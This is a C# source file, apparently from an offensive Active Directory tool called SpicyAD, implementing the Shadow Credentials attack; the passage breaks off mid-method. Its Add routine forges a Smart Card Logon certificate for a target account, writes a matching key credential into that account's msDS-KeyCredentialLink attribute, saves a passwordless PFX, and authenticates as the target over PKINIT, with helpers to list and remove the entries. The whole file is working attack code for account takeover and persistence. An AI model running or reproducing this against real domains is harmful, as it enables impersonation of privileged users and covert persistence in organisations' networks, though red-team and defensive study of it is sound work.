using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace SpicyAD
{
    
    /// Shadow Credentials attack implementation
    /// Similar to Whisker by Elad Shamir
    /// Writes to msDS-KeyCredentialLink attribute for PKINIT persistence
    public static class ShadowCredentials
    {
        // KeyCredential entry types per MS-ADTS
        private const int KEY_USAGE_NGC = 0x01;
        private const int KEY_USAGE_FIDO = 0x07;
        private const int KEY_SOURCE_AD = 0x00;
        private const int KEY_SOURCE_AZUREAD = 0x01;

        // Entry identifiers
        private const byte KCEI_VERSION = 0x00;
        private const byte KCEI_KEYID = 0x01;
        private const byte KCEI_KEYHASH = 0x02;
        private const byte KCEI_KEYMATERIAL = 0x03;
        private const byte KCEI_KEYUSAGE = 0x04;
        private const byte KCEI_KEYSOURCE = 0x05;
        private const byte KCEI_DEVICEID = 0x06;
        private const byte KCEI_CUSTOMKEYINFO = 0x07;
        private const byte KCEI_KEYLASTLOGON = 0x08;
        private const byte KCEI_KEYCREATION = 0x09;

        
        /// Add Shadow Credentials to a target object
        public static void Add(string targetDN = null, string targetSamAccountName = null, string deviceId = null, string outFile = null, bool includeSid = false)
        {
            Console.WriteLine("[*] Shadow Credentials Attack\n");

            try
            {
                // Resolve target DN
                string dn = ResolveTargetDN(targetDN, targetSamAccountName);
                if (string.IsNullOrEmpty(dn))
                {
                    Console.WriteLine("[!] Could not resolve target DN");
                    return;
                }
                OutputHelper.Verbose($"[+] Target: {dn}");

                // Get target SID if requested
                string targetSid = null;
                if (includeSid)
                {
                    targetSid = GetObjectSid(dn);
                    if (!string.IsNullOrEmpty(targetSid))
                    {
                        Console.WriteLine($"[+] Target SID: {targetSid}");
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("[!] Could not retrieve target SID - certificate will NOT include SID");
                        Console.WriteLine("[!] Strong Certificate Mapping (KB5014754) may fail");
                        Console.ResetColor();
                    }
                }

                // Generate certificate first, then extract key from it to ensure consistency
                OutputHelper.Verbose("[*] Generating RSA key pair and certificate...");
                using (RSA rsa = new RSACryptoServiceProvider(2048,
                    new CspParameters(24, "Microsoft Enhanced RSA and AES Cryptographic Provider", Guid.NewGuid().ToString())))
                {
                    // Build certificate and extract public key from it (ensures consistency)
                    var (cert, publicKeyBytes, certPath) = GenerateCertificateAndKey(rsa, dn, outFile, targetSid);
                    OutputHelper.Verbose($"[+] RSA key pair generated ({publicKeyBytes.Length} bytes public key)");

                    // Generate Device ID if not provided
                    Guid deviceGuid = string.IsNullOrEmpty(deviceId) ? Guid.NewGuid() : Guid.Parse(deviceId);
                    OutputHelper.Verbose($"[+] Device ID: {deviceGuid}");

                    // Build KeyCredential blob
                    byte[] keyCredential = BuildKeyCredentialBlob(publicKeyBytes, deviceGuid);
                    OutputHelper.Verbose($"[+] KeyCredential blob built ({keyCredential.Length} bytes)");

                    // Write to AD
                    OutputHelper.Verbose("[*] Writing msDS-KeyCredentialLink attribute...");
                    if (WriteKeyCredentialLink(dn, keyCredential))
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("[+] Shadow Credential added successfully!");
                        Console.WriteLine($"[+] Certificate: {certPath}");
                        Console.ResetColor();
                        OutputHelper.Verbose($"[+] Device ID: {deviceGuid}");

                        // Automatically authenticate via PKINIT
                        string targetUser = targetSamAccountName;
                        if (string.IsNullOrEmpty(targetUser))
                        {
                            // Extract CN from DN (e.g., "CN=Administrator,CN=Users,DC=domain,DC=com" -> "Administrator")
                            var cnMatch = System.Text.RegularExpressions.Regex.Match(dn, @"CN=([^,]+)", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                            if (cnMatch.Success)
                                targetUser = cnMatch.Groups[1].Value;
                        }

                        Console.WriteLine($"\n[*] Authenticating as {targetUser} using PKINIT...\n");
                        PkinitAuth.AskTgt(certPath, "", AuthContext.DomainName, targetUser, true);
                    }
                    else
                    {
                        Console.WriteLine("[!] Failed to write msDS-KeyCredentialLink attribute");
                        // Clean up certificate file
                        if (File.Exists(certPath)) File.Delete(certPath);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
                if (ex.InnerException != null)
                    Console.WriteLine($"[!] Inner: {ex.InnerException.Message}");
            }
        }

        
        /// List existing Shadow Credentials on a target
        public static void List(string targetDN = null, string targetSamAccountName = null)
        {
            Console.WriteLine("[*] Listing Shadow Credentials\n");

            try
            {
                string dn = ResolveTargetDN(targetDN, targetSamAccountName);
                if (string.IsNullOrEmpty(dn))
                {
                    Console.WriteLine("[!] Could not resolve target DN");
                    return;
                }
                OutputHelper.Verbose($"[+] Target: {dn}");

                using (DirectoryEntry entry = AuthContext.GetDirectoryEntry($"LDAP://{dn}"))
                {
                    if (entry.Properties.Contains("msDS-KeyCredentialLink"))
                    {
                        var keyCredLinks = entry.Properties["msDS-KeyCredentialLink"];
                        Console.WriteLine($"[+] Found {keyCredLinks.Count} KeyCredential(s):\n");

                        int index = 0;
                        foreach (var kcl in keyCredLinks)
                        {
                            OutputHelper.Verbose($"  [{index}] =====================================");
                            ParseAndDisplayKeyCredential(kcl, index);
                            index++;
                        }
                    }
                    else
                    {
                        Console.WriteLine("[*] No msDS-KeyCredentialLink values found");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        
        /// Remove a Shadow Credential by DeviceID
        public static void Remove(string targetDN = null, string targetSamAccountName = null, string deviceId = null, bool removeAll = false)
        {
            Console.WriteLine("[*] Removing Shadow Credentials\n");

            try
            {
                string dn = ResolveTargetDN(targetDN, targetSamAccountName);
                if (string.IsNullOrEmpty(dn))
                {
                    Console.WriteLine("[!] Could not resolve target DN");
                    return;
                }
                OutputHelper.Verbose($"[+] Target: {dn}");

                using (DirectoryEntry entry = AuthContext.GetDirectoryEntry($"LDAP://{dn}"))
                {
                    if (!entry.Properties.Contains("msDS-KeyCredentialLink"))
                    {
                        Console.WriteLine("[*] No msDS-KeyCredentialLink values to remove");
                        return;
                    }

                    if (removeAll)
                    {
                        Console.WriteLine("[*] Removing ALL KeyCredentials...");
                        entry.Properties["msDS-KeyCredentialLink"].Clear();
                        entry.CommitChanges();
                        Console.WriteLine("[+] All KeyCredentials removed");
                        return;
                    }

                    if (string.IsNullOrEmpty(deviceId))
                    {
                        Console.WriteLine("[!] Please specify /deviceid:<guid> or /all to remove");
                        return;
                    }

                    Guid targetGuid = Guid.Parse(deviceId);
                    var toRemove = new List<object>();

                    foreach (var kcl in entry.Properties["msDS-KeyCredentialLink"])
                    {
                        Guid? parsedGuid = ExtractDeviceIdFromKeyCredential(kcl);
                        if (parsedGuid.HasValue && parsedGuid.Value == targetGuid)
                        {
                            toRemove.Add(kcl);
                        }
                    }

                    if (toRemove.Count == 0)
                    {
                        Console.WriteLine($"[!] No KeyCredential found with DeviceID: {deviceId}");
                        return;
                    }

                    foreach (var item in toRemove)
                    {
                        entry.Properties["msDS-KeyCredentialLink"].Remove(item);
                    }
                    entry.CommitChanges();
                    Console.WriteLine($"[+] Removed {toRemove.Count} KeyCredential(s) with DeviceID: {deviceId}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        
        /// Clear all Shadow Credentials from target
        public static void Clear(string targetDN = null, string targetSamAccountName = null)
        {
            Remove(targetDN, targetSamAccountName, null, removeAll: true);
        }

        private static string GetObjectSid(string dn)
        {
            try
            {
                // Try direct DN access first
                using (DirectoryEntry entry = AuthContext.GetDirectoryEntry($"LDAP://{dn}"))
                {
                    entry.RefreshCache(new[] { "objectSid" });
                    if (entry.Properties.Contains("objectSid") && entry.Properties["objectSid"].Count > 0)
                    {
                        byte[] sidBytes = (byte[])entry.Properties["objectSid"][0];
                        var sid = new System.Security.Principal.SecurityIdentifier(sidBytes, 0);
                        return sid.ToString();
                    }
                }
            }
            catch (Exception ex)
            {
                OutputHelper.Verbose($"[!] GetObjectSid direct access failed: {ex.Message}");
            }

            // Fallback: search by DN
            try
            {
                using (DirectoryEntry root = AuthContext.GetDirectoryEntry())
                using (DirectorySearcher searcher = new DirectorySearcher(root))
                {
                    searcher.Filter = $"(distinguishedName={dn})";
                    searcher.PropertiesToLoad.Add("objectSid");
                    SearchResult result = searcher.FindOne();
                    if (result != null && result.Properties.Contains("objectSid") && result.Properties["objectSid"].Count > 0)
                    {
                        byte[] sidBytes = (byte[])result.Properties["objectSid"][0];
                        var sid = new System.Security.Principal.SecurityIdentifier(sidBytes, 0);
                        return sid.ToString();
                    }
                }
            }
            catch (Exception ex)
            {
                OutputHelper.Verbose($"[!] GetObjectSid search failed: {ex.Message}");
            }

            return null;
        }

        private static string ResolveTargetDN(string targetDN, string targetSamAccountName)
        {
            if (!string.IsNullOrEmpty(targetDN))
                return targetDN;

            if (!string.IsNullOrEmpty(targetSamAccountName))
            {
                // Search for the object by sAMAccountName
                using (DirectoryEntry root = AuthContext.GetRootDSE())
                {
                    string defaultNC = root.Properties["defaultNamingContext"].Value.ToString();

                    using (DirectoryEntry searchRoot = AuthContext.GetDirectoryEntry($"LDAP://{defaultNC}"))
                    using (DirectorySearcher searcher = new DirectorySearcher(searchRoot))
                    {
                        searcher.Filter = $"(sAMAccountName={targetSamAccountName})";
                        searcher.PropertiesToLoad.Add("distinguishedName");

                        SearchResult result = searcher.FindOne();
                        if (result != null)
                        {
                            return result.Properties["distinguishedName"][0].ToString();
                        }
                    }
                }
            }

            Console.WriteLine("[!] Please specify target with /target:<sAMAccountName> or /dn:<distinguishedName>");
            return null;
        }

        // Export RSA public key from X509Certificate2 in BCRYPT format (for user accounts)
        // This uses the official Windows CNG API to ensure exact compatibility
        private static byte[] ExportRSAPublicKeyBCryptFromCert(X509Certificate2 certificate)
        {
            // Use RSACng to get the CngKey and export in BCRYPT_RSAKEY_BLOB format
            // This is the EXACT method that DSInternals/Whisker uses
            using (var rsa = (RSACng)certificate.GetRSAPublicKey())
            {
                using (var key = rsa.Key)
                {
                    // CngKeyBlobFormat for "RSAPUBLICBLOB" is the BCRYPT_RSAKEY_BLOB format
                    CngKeyBlobFormat format = new CngKeyBlobFormat("RSAPUBLICBLOB");
                    return key.Export(format);
                }
            }
        }

        private static byte[] ExportRSAPublicKey(RSA rsa, bool useDerFormat = false)
        {
            RSAParameters rsaParams = rsa.ExportParameters(false);

            if (useDerFormat)
            {
                // DER-encoded RSAPublicKey format (for computer accounts)
                // RSAPublicKey ::= SEQUENCE { modulus INTEGER, publicExponent INTEGER }
                return ExportRSAPublicKeyDER(rsaParams);
            }
            else
            {
                // BCRYPT_RSAKEY_BLOB format (for user accounts) - MANUAL FALLBACK ONLY
                return ExportRSAPublicKeyBCrypt(rsaParams);
            }
        }

        private static byte[] ExportRSAPublicKeyBCrypt(RSAParameters rsaParams)
        {
            // Build BCRYPT_RSAKEY_BLOB structure
            // BCRYPT_RSAPUBLIC_MAGIC = 0x31415352 = "RSA1"
            using (MemoryStream ms = new MemoryStream())
            using (BinaryWriter bw = new BinaryWriter(ms))
            {
                bw.Write(0x31415352); // BCRYPT_RSAPUBLIC_MAGIC "RSA1"
                bw.Write(rsaParams.Modulus.Length * 8); // BitLength
                bw.Write(rsaParams.Exponent.Length); // cbPublicExp
                bw.Write(rsaParams.Modulus.Length); // cbModulus
                bw.Write(0); // cbPrime1 (0 for public key)
                bw.Write(0); // cbPrime2 (0 for public key)
                bw.Write(rsaParams.Exponent); // Exponent
                bw.Write(rsaParams.Modulus); // Modulus

                return ms.ToArray();
            }
        }

        private static byte[] ExportRSAPublicKeyDER(RSAParameters rsaParams)
        {
            // DER-encoded RSAPublicKey format
            // RSAPublicKey ::= SEQUENCE { modulus INTEGER, publicExponent INTEGER }

            // Build INTEGER for modulus (needs leading 0x00 if high bit is set)
            byte[] modulus = rsaParams.Modulus;
            if (modulus[0] >= 0x80)
            {
                byte[] temp = new byte[modulus.Length + 1];
                Array.Copy(modulus, 0, temp, 1, modulus.Length);
                modulus = temp;
            }
            byte[] modulusInteger = BuildDerInteger(modulus);

            // Build INTEGER for exponent
            byte[] exponent = rsaParams.Exponent;
            if (exponent[0] >= 0x80)
            {
                byte[] temp = new byte[exponent.Length + 1];
                Array.Copy(exponent, 0, temp, 1, exponent.Length);
                exponent = temp;
            }
            byte[] exponentInteger = BuildDerInteger(exponent);

            // Build SEQUENCE
            byte[] sequenceContent = new byte[modulusInteger.Length + exponentInteger.Length];
            Array.Copy(modulusInteger, 0, sequenceContent, 0, modulusInteger.Length);
            Array.Copy(exponentInteger, 0, sequenceContent, modulusInteger.Length, exponentInteger.Length);

            return BuildDerSequence(sequenceContent);
        }

        private static byte[] BuildDerInteger(byte[] value)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                ms.WriteByte(0x02); // INTEGER tag
                WriteDerLength(ms, value.Length);
                ms.Write(value, 0, value.Length);
                return ms.ToArray();
            }
        }

        private static byte[] BuildDerSequence(byte[] content)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                ms.WriteByte(0x30); // SEQUENCE tag
                WriteDerLength(ms, content.Length);
                ms.Write(content, 0, content.Length);
                return ms.ToArray();
            }
        }

        private static void WriteDerLength(MemoryStream ms, int length)
        {
            if (length < 128)
            {
                ms.WriteByte((byte)length);
            }
            else if (length < 256)
            {
                ms.WriteByte(0x81);
                ms.WriteByte((byte)length);
            }
            else
            {
                ms.WriteByte(0x82);
                ms.WriteByte((byte)(length >> 8));
                ms.WriteByte((byte)(length & 0xFF));
            }
        }

        private static byte[] BuildKeyCredentialBlob(byte[] publicKey, Guid deviceId)
        {
            // KeyCredentialLink binary format (per DSInternals/MS-ADTS):
            // Version (4 bytes) = 0x00000200 (Version 2)
            // Entries (variable)
            // Each entry: Length (2 bytes) + Type (1 byte) + Data (variable)
            //
            // CRITICAL: KeyHash must be SHA256 of all entries AFTER KeyHash (including their headers!)
            // This matches DSInternals/Whisker implementation exactly

            // First, build all the entries that come AFTER KeyHash
            // These will be hashed to compute KeyHash
            // Order must match Whisker/DSInternals: KeyMaterial, KeyUsage, KeySource, DeviceId, CustomKeyInfo, LastLogon, CreationTime
            byte[] keyMaterialEntry = BuildEntry(KCEI_KEYMATERIAL, publicKey);
            byte[] keyUsageEntry = BuildEntry(KCEI_KEYUSAGE, new byte[] { KEY_USAGE_NGC });
            byte[] keySourceEntry = BuildEntry(KCEI_KEYSOURCE, new byte[] { KEY_SOURCE_AD });
            byte[] deviceIdEntry = BuildEntry(KCEI_DEVICEID, deviceId.ToByteArray());
            byte[] customKeyInfoEntry = BuildEntry(KCEI_CUSTOMKEYINFO, BuildCustomKeyInfo());
            long fileTime = DateTime.UtcNow.ToFileTimeUtc();
            // For user accounts, include LastLogonTime = CreationTime (same as Whisker)
            byte[] keyLastLogonEntry = BuildEntry(KCEI_KEYLASTLOGON, BitConverter.GetBytes(fileTime));
            byte[] keyCreationEntry = BuildEntry(KCEI_KEYCREATION, BitConverter.GetBytes(fileTime));

            // Concatenate all entries that will be hashed (entries 3-9, WITH their headers)
            byte[] binaryProperties;
            using (MemoryStream propMs = new MemoryStream())
            {
                propMs.Write(keyMaterialEntry, 0, keyMaterialEntry.Length);
                propMs.Write(keyUsageEntry, 0, keyUsageEntry.Length);
                propMs.Write(keySourceEntry, 0, keySourceEntry.Length);
                propMs.Write(deviceIdEntry, 0, deviceIdEntry.Length);
                propMs.Write(customKeyInfoEntry, 0, customKeyInfoEntry.Length);
                propMs.Write(keyLastLogonEntry, 0, keyLastLogonEntry.Length);
                propMs.Write(keyCreationEntry, 0, keyCreationEntry.Length);
                binaryProperties = propMs.ToArray();
            }

            // KeyID = SHA256(KeyMaterial) for Version 2
            byte[] keyId;
            using (SHA256 sha256 = SHA256.Create())
            {
                keyId = sha256.ComputeHash(publicKey);
            }

            // KeyHash = SHA256(binaryProperties) - hash of all serialized entries WITH headers
            byte[] keyHash;
            using (SHA256 sha256 = SHA256.Create())
            {
                keyHash = sha256.ComputeHash(binaryProperties);
            }

            // Now build the final blob
            using (MemoryStream ms = new MemoryStream())
            using (BinaryWriter bw = new BinaryWriter(ms))
            {
                // Version - 0x200 = Version 2
                bw.Write((uint)0x00000200);

                // Write KeyID entry
                bw.Write(BuildEntry(KCEI_KEYID, keyId));

                // Write KeyHash entry
                bw.Write(BuildEntry(KCEI_KEYHASH, keyHash));

                // Write the remaining entries (already serialized)
                bw.Write(binaryProperties);

                return ms.ToArray();
            }
        }

        private static byte[] BuildEntry(byte identifier, byte[] data)
        {
            // DSInternals format: Length (2 bytes) + Type (1 byte) + Data
            using (MemoryStream ms = new MemoryStream())
            using (BinaryWriter bw = new BinaryWriter(ms))
            {
                bw.Write((ushort)data.Length);  // 2 bytes - Length of value
                bw.Write(identifier);           // 1 byte - Entry type
                bw.Write(data);                 // Variable - Value
                return ms.ToArray();
            }
        }

        private static byte[] BuildCustomKeyInfo()
        {
            // CustomKeyInfo structure:
            // Version (1 byte) = 1
            // Flags (1 byte) = 0
            using (MemoryStream ms = new MemoryStream())
            {
                ms.WriteByte(0x01); // Version
                ms.WriteByte(0x00); // Flags
                return ms.ToArray();
            }
        }

        private static bool WriteKeyCredentialLink(string targetDN, byte[] keyCredential)
        {
            try
            {
                // Build the DNWithBinary value
                // Format: B:<length>:<hex_value>:<dn>
                string hexValue = BitConverter.ToString(keyCredential).Replace("-", "");
                string dnWithBinary = $"B:{hexValue.Length}:{hexValue}:{targetDN}";

                using (DirectoryEntry entry = AuthContext.GetDirectoryEntry($"LDAP://{targetDN}"))
                {
                    entry.Properties["msDS-KeyCredentialLink"].Add(dnWithBinary);
                    entry.CommitChanges();
                    return true;
                }
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("[!] Access denied - no write permissions on target");
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] LDAP write error: {ex.Message}");
                return false;
            }
        }

        private static (X509Certificate2 cert, byte[] publicKey, string certPath) GenerateCertificateAndKey(RSA rsa, string targetDN, string outFile, string targetSid = null)
        {
            // Extract CN from DN and build UPN
            string cn = targetDN;
            string domain = null;

            if (targetDN.StartsWith("CN=", StringComparison.OrdinalIgnoreCase))
            {
                int commaIndex = targetDN.IndexOf(',');
                cn = commaIndex > 0 ? targetDN.Substring(3, commaIndex - 3) : targetDN.Substring(3);

                // Extract domain from DN
                var dcParts = new List<string>();
                foreach (var part in targetDN.Split(','))
                {
                    if (part.Trim().StartsWith("DC=", StringComparison.OrdinalIgnoreCase))
                    {
                        dcParts.Add(part.Trim().Substring(3));
                    }
                }
                if (dcParts.Count > 0)
                {
                    domain = string.Join(".", dcParts);
                }
            }

            // Build UPN
            string upn = domain != null ? $"{cn}@{domain}" : cn;

            // Generate self-signed certificate with Smart Card Logon EKU
            CertificateRequest certRequest = new CertificateRequest(
                $"CN={cn}",
                rsa,
                HashAlgorithmName.SHA256,
                RSASignaturePadding.Pkcs1);

            // Add Smart Card Logon and Client Authentication EKUs
            certRequest.CertificateExtensions.Add(
                new X509EnhancedKeyUsageExtension(
                    new OidCollection {
                        new Oid("1.3.6.1.5.5.7.3.2"),       // Client Authentication
                        new Oid("1.3.6.1.4.1.311.20.2.2")  // Smart Card Logon
                    },
                    false));

            // Add Key Usage
            certRequest.CertificateExtensions.Add(
                new X509KeyUsageExtension(
                    X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment,
                    false));

            // Build SAN extension with UPN (REQUIRED for PKINIT) and optionally SID for strong certificate mapping
            OutputHelper.Verbose($"[+] Certificate Subject: CN={cn}");
            OutputHelper.Verbose($"[+] Certificate UPN SAN: {upn}");

            if (!string.IsNullOrEmpty(targetSid))
            {
                // Add SAN with both UPN and SID URL (KB5014754 strong mapping)
                byte[] sanExtension = BuildSanWithUpnAndSid(upn, targetSid);
                certRequest.CertificateExtensions.Add(
                    new X509Extension(new Oid("2.5.29.17"), sanExtension, false));
                Console.WriteLine($"[+] Certificate SID URL: tag:microsoft.com,2022-09-14:sid:{targetSid}");
            }
            else
            {
                // CRITICAL: Always add UPN to SAN - required for PKINIT authentication
                byte[] sanExtension = BuildUpnSanExtension(upn);
                certRequest.CertificateExtensions.Add(
                    new X509Extension(new Oid("2.5.29.17"), sanExtension, false));
            }

            // CRITICAL FIX: Export public key from ORIGINAL RSA object BEFORE creating certificate
            // This ensures the EXACT SAME bytes go into both the certificate AND the KeyCredential blob
            // If we export from the certificate after creation, the key bytes can differ slightly
            byte[] publicKeyBytes = ExportRSAPublicKey(rsa, useDerFormat: false);

            // Create certificate valid for 1 year
            DateTimeOffset notBefore = DateTimeOffset.UtcNow;
            DateTimeOffset notAfter = notBefore.AddYears(1);

            X509Certificate2 cert = certRequest.CreateSelfSigned(notBefore, notAfter);

            // Export to PFX
            string fileName = outFile ?? $"{cn}_shadow_{DateTime.Now:yyyyMMdd_HHmmss}.pfx";
            byte[] pfxBytes = cert.Export(X509ContentType.Pfx, "");
            File.WriteAllBytes(fileName, pfxBytes);

            return (cert, publicKeyBytes, fileName);
        }

        private static string GenerateCertificate(RSA rsa, string targetDN, string outFile)
        {
            // Extract CN from DN and build UPN
            string cn = targetDN;
            string domain = null;

            if (targetDN.StartsWith("CN=", StringComparison.OrdinalIgnoreCase))
            {
                int commaIndex = targetDN.IndexOf(',');
                cn = commaIndex > 0 ? targetDN.Substring(3, commaIndex - 3) : targetDN.Substring(3);

                // Extract domain from DN (e.g., DC=evilcorp,DC=local -> evilcorp.local)
                var dcParts = new List<string>();
                foreach (var part in targetDN.Split(','))
                {
                    if (part.Trim().StartsWith("DC=", StringComparison.OrdinalIgnoreCase))
                    {
                        dcParts.Add(part.Trim().Substring(3));
                    }
                }
                if (dcParts.Count > 0)
                {
                    domain = string.Join(".", dcParts);
                }
            }

            // Build UPN
            string upn = domain != null ? $"{cn}@{domain}" : cn;

            // Generate self-signed certificate
            CertificateRequest certRequest = new CertificateRequest(
                $"CN={cn}",
                rsa,
                HashAlgorithmName.SHA256,
                RSASignaturePadding.Pkcs1);

            // Add Client Authentication EKU and Smart Card Logon
            certRequest.CertificateExtensions.Add(
                new X509EnhancedKeyUsageExtension(
                    new OidCollection {
                        new Oid("1.3.6.1.5.5.7.3.2"),       // Client Auth
                        new Oid("1.3.6.1.4.1.311.20.2.2")  // Smart Card Logon
                    },
                    false));

            // Add Key Usage
            certRequest.CertificateExtensions.Add(
                new X509KeyUsageExtension(
                    X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment,
                    false));

            // Add Subject Alternative Name with UPN
            // OID 1.3.6.1.4.1.311.20.2.3 = szOID_NT_PRINCIPAL_NAME (UPN)
            byte[] upnSan = BuildUpnSanExtension(upn);
            certRequest.CertificateExtensions.Add(
                new X509Extension(new Oid("2.5.29.17"), upnSan, false));

            // Create certificate valid for 1 year
            DateTimeOffset notBefore = DateTimeOffset.UtcNow;
            DateTimeOffset notAfter = notBefore.AddYears(1);

            X509Certificate2 cert = certRequest.CreateSelfSigned(notBefore, notAfter);

            // Export to PFX
            string fileName = outFile ?? $"{cn}_shadow_{DateTime.Now:yyyyMMdd_HHmmss}.pfx";
            byte[] pfxBytes = cert.Export(X509ContentType.Pfx, "");
            File.WriteAllBytes(fileName, pfxBytes);

            return fileName;
        }

        private static byte[] BuildSanWithUpnAndSid(string upn, string sid)
        {
            // Build SAN extension with both UPN and SID URL for strong certificate mapping (KB5014754)
            // Using URL format that works: tag:microsoft.com,2022-09-14:sid:<SID>
            // GeneralNames ::= SEQUENCE SIZE (1..MAX) OF GeneralName

            using (MemoryStream generalNamesContent = new MemoryStream())
            {
                // 1. Add UPN OtherName
                byte[] upnGeneralName = BuildUpnOtherName(upn);
                generalNamesContent.Write(upnGeneralName, 0, upnGeneralName.Length);

                // 2. Add SID as URL (uniformResourceIdentifier [6] IA5String)
                // Format: tag:microsoft.com,2022-09-14:sid:<SID>
                string sidUrl = $"tag:microsoft.com,2022-09-14:sid:{sid}";
                byte[] sidUrlBytes = Encoding.ASCII.GetBytes(sidUrl);
                byte[] sidUrlGeneralName = BuildAsn1(0x86, sidUrlBytes); // [6] implicit IA5String for URI
                generalNamesContent.Write(sidUrlGeneralName, 0, sidUrlGeneralName.Length);

                // Wrap in GeneralNames SEQUENCE
                return BuildAsn1(0x30, generalNamesContent.ToArray());
            }
        }

        private static byte[] BuildUpnOtherName(string upn)
        {
            // OtherName for UPN
            // OID: 1.3.6.1.4.1.311.20.2.3 (szOID_NT_PRINCIPAL_NAME)
            byte[] upnOidBytes = new byte[] { 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03 };

            // UTF8String encoding of UPN
            byte[] upnBytes = Encoding.UTF8.GetBytes(upn);
            byte[] utf8String = BuildAsn1(0x0C, upnBytes);

            // Wrap in explicit [0] context tag
            byte[] explicitValue = BuildAsn1(0xA0, utf8String);

            // Build OtherName content: OID + explicit value
            byte[] otherNameContent = new byte[upnOidBytes.Length + explicitValue.Length];
            Array.Copy(upnOidBytes, 0, otherNameContent, 0, upnOidBytes.Length);
            Array.Copy(explicitValue, 0, otherNameContent, upnOidBytes.Length, explicitValue.Length);

            // Wrap in implicit [0] for GeneralName choice (otherName)
            // OtherName is SEQUENCE, but GeneralName uses implicit tagging [0]
            return BuildAsn1(0xA0, otherNameContent);
        }

        private static byte[] BuildSidOtherName(string sid)
        {
            // OtherName for SID (KB5014754 strong mapping)
            // OID: 1.3.6.1.4.1.311.25.2 (szOID_NTDS_CA_SECURITY_EXT)
            byte[] sidOidBytes = new byte[] { 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x19, 0x02 };

            // Convert SID string to bytes
            var securityIdentifier = new System.Security.Principal.SecurityIdentifier(sid);
            byte[] sidBytes = new byte[securityIdentifier.BinaryLength];
            securityIdentifier.GetBinaryForm(sidBytes, 0);

            // Build the SID extension structure per MS spec:
            // SEQUENCE {
            //   OID 1.3.6.1.4.1.311.25.2.1
            //   OCTET STRING { SID bytes }
            // }
            byte[] sidOidInner = new byte[] { 0x06, 0x0B, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x19, 0x02, 0x01 };
            byte[] octetString = BuildAsn1(0x04, sidBytes);

            byte[] seqContent = new byte[sidOidInner.Length + octetString.Length];
            Array.Copy(sidOidInner, 0, seqContent, 0, sidOidInner.Length);
            Array.Copy(octetString, 0, seqContent, sidOidInner.Length, octetString.Length);
            byte[] sidSeq = BuildAsn1(0x30, seqContent);

            // Wrap in explicit [0] context tag for OtherName value
            byte[] explicitValue = BuildAsn1(0xA0, sidSeq);

            // Build OtherName content: OID + explicit value
            byte[] otherNameContent = new byte[sidOidBytes.Length + explicitValue.Length];
            Array.Copy(sidOidBytes, 0, otherNameContent, 0, sidOidBytes.Length);
            Array.Copy(explicitValue, 0, otherNameContent, sidOidBytes.Length, explicitValue.Length);

            // Wrap in implicit [0] for GeneralName choice (otherName)
            return BuildAsn1(0xA0, otherNameContent);
        }

        private static byte[] BuildUpnSanExtension(string upn)
        {
            // Build SAN extension with UPN OtherName
            // GeneralNames ::= SEQUENCE SIZE (1..MAX) OF GeneralName
            // GeneralName ::= CHOICE { otherName [0] OtherName, ... }
            // OtherName ::= SEQUENCE { type-id OBJECT IDENTIFIER, value [0] EXPLICIT ANY DEFINED BY type-id }

            // UPN OID: 1.3.6.1.4.1.311.20.2.3
            byte[] upnOidBytes = new byte[] { 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03 };

            // UTF8String encoding of UPN
            byte[] upnBytes = Encoding.UTF8.GetBytes(upn);
            byte[] utf8String = BuildAsn1(0x0C, upnBytes); // UTF8String tag = 0x0C

            // Wrap in explicit [0] context tag
            byte[] explicitValue = BuildAsn1(0xA0, utf8String);

            // Build OtherName SEQUENCE: OID + explicit value
            byte[] otherNameContent = new byte[upnOidBytes.Length + explicitValue.Length];
            Array.Copy(upnOidBytes, 0, otherNameContent, 0, upnOidBytes.Length);
            Array.Copy(explicitValue, 0, otherNameContent, upnOidBytes.Length, explicitValue.Length);
            byte[] otherNameSeq = BuildAsn1(0x30, otherNameContent);

            // Wrap in implicit [0] for GeneralName choice (otherName)
            byte[] generalName = BuildAsn1(0xA0, otherNameSeq.Skip(2).ToArray()); // Skip SEQUENCE tag+len, use implicit [0]

            // GeneralNames SEQUENCE
            byte[] generalNames = BuildAsn1(0x30, generalName);

            return generalNames;
        }

        private static byte[] BuildAsn1(byte tag, byte[] content)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                ms.WriteByte(tag);
                if (content.Length < 128)
                {
                    ms.WriteByte((byte)content.Length);
                }
                else if (content.Length < 256)
                {
                    ms.WriteByte(0x81);
                    ms.WriteByte((byte)content.Length);
                }
                else
                {
                    ms.WriteByte(0x82);
                    ms.WriteByte((byte)(content.Length >> 8));
                    ms.WriteByte((byte)(content.Length & 0xFF));
                }
                ms.Write(content, 0, content.Length);
                return ms.ToArray();
            }
        }

        private static void ParseAndDisplayKeyCredential(object keyCredLink, int index)
        {
            try
            {
                byte[] blobData = null;
                string dnString = null;

                // DNWithBinary comes as a COM object with BinaryValue and DNString properties
                Type type = keyCredLink.GetType();
                var binaryValue = type.InvokeMember("BinaryValue",
                    System.Reflection.BindingFlags.GetProperty, null, keyCredLink, null);
                var dnValue = type.InvokeMember("DNString",
                    System.Reflection.BindingFlags.GetProperty, null, keyCredLink, null);

                if (binaryValue is byte[] bytes)
                {
                    blobData = bytes;
                    dnString = dnValue?.ToString();
                }
                else
                {
                    // Fallback: try parsing as string (B:<length>:<hex_value>:<dn>)
